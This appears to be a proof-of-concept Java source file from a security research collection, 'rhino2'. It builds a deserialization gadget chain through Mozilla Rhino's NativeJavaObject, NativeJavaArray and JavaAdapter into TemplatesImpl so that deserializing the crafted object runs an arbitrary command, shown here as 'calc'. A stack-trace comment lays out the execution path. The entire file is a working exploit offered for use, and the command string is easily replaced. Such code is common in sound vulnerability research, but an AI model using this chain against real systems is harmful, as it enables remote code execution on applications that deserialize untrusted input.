package com.javasec.pocs.rhino;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;
import sun.misc.Unsafe;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invoke:161, MemberBox (org.mozilla.javascript)
 * get:118, JavaMembers (org.mozilla.javascript)
 * get:113, NativeJavaObject (org.mozilla.javascript)
 * get:99, NativeJavaArray (org.mozilla.javascript)
 * getProperty:1617, ScriptableObject (org.mozilla.javascript)
 * getObjectFunctionNames:290, JavaAdapter (org.mozilla.javascript)
 * getAdapterClass:311, JavaAdapter (org.mozilla.javascript)
 * readAdapterObject:262, JavaAdapter (org.mozilla.javascript)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * readObject:940, NativeJavaObject (org.mozilla.javascript)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:64, SerializeUtils (com.javasec.utils)
 * deserTester:309, SerializeUtils (com.javasec.utils)
 * main:105, rhino2 (com.javasec.pocs.rhino)
 */
public class rhino2 {
    public static void main(String[] args) throws Exception {
        // 生成包含恶意类字节码的 TemplatesImpl 类
        Templates tmpl = SerializeUtils.getTemplate("calc");

        // 初始化一个 Environment 对象作为 scope
        ScriptableObject scope = new Environment();
        // 创建 associatedValues
        Map<Object, Object> associatedValues = new Hashtable<>();
        // 创建一个 ClassCache 实例
        Unsafe unsafe = SerializeUtils.getUnsafe();
        Object classCacheObject = unsafe.allocateInstance(ClassCache.class);
        associatedValues.put("ClassCache", classCacheObject);
        Field associateField = ScriptableObject.class.getDeclaredField("associatedValues");
        associateField.setAccessible(true);
        associateField.set(scope, associatedValues);
        Object initContextMemberBox = SerializeUtils.newInstance("org.mozilla.javascript.MemberBox", Context.class.getMethod("enter"));
        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        makeSlot.setAccessible(true);
        Object slot = makeSlot.invoke(initContextScriptableObject, "su18", 0, 4);

        Class<?> slotClass   = Class.forName("org.mozilla.javascript.ScriptableObject$GetterSlot");
        Field    getterField = slotClass.getDeclaredField("getter");
        getterField.setAccessible(true);
        getterField.set(slot, initContextMemberBox);


        // 实例化 NativeJavaObject 类
        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();

        Field parentField = NativeJavaObject.class.getDeclaredField("parent");
        parentField.setAccessible(true);
        parentField.set(initContextNativeJavaObject, scope);
        Field isAdapterField = NativeJavaObject.class.getDeclaredField("isAdapter");
        isAdapterField.setAccessible(true);
        isAdapterField.set(initContextNativeJavaObject, true);
        Field adapterObject = NativeJavaObject.class.getDeclaredField("adapter_writeAdapterObject");
        adapterObject.setAccessible(true);
        adapterObject.set(initContextNativeJavaObject, rhino2.class.getDeclaredMethod("customWriteAdapterObject",
                Object.class, ObjectOutputStream.class));

        Field javaObject = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject.setAccessible(true);
        javaObject.set(initContextNativeJavaObject, initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);


        // 实例化 NativeJavaArray类
        NativeJavaArray nativeJavaArray = (NativeJavaArray) unsafe.allocateInstance(NativeJavaArray.class);
        Field parentField2 = NativeJavaObject.class.getDeclaredField("parent");
        parentField2.setAccessible(true);
        parentField2.set(nativeJavaArray, scope);

        Field javaObject2 = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject2.setAccessible(true);
        javaObject2.set(nativeJavaArray, tmpl);

        nativeJavaArray.setPrototype(scriptableObject);

        Field prototypeField = NativeJavaObject.class.getDeclaredField("prototype");
        prototypeField.setAccessible(true);
        prototypeField.set(nativeJavaArray, scriptableObject);

        // 实例化最外层的 NativeJavaObject

        NativeJavaObject nativeJavaObject = new NativeJavaObject();

        Field parentField3 = NativeJavaObject.class.getDeclaredField("parent");
        parentField3.setAccessible(true);
        parentField3.set(nativeJavaObject, scope);

        Field isAdapterField3 = NativeJavaObject.class.getDeclaredField("isAdapter");
        isAdapterField3.setAccessible(true);
        isAdapterField3.set(nativeJavaObject, true);

        Field adapterObject3 = NativeJavaObject.class.getDeclaredField("adapter_writeAdapterObject");
        adapterObject3.setAccessible(true);
        adapterObject3.set(nativeJavaObject, rhino2.class.getDeclaredMethod("customWriteAdapterObject",
                Object.class, ObjectOutputStream.class));

        Field javaObject3 = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject3.setAccessible(true);
        javaObject3.set(nativeJavaObject, nativeJavaArray);
        SerializeUtils.deserTester(nativeJavaObject);
    }
    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException, IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }
}
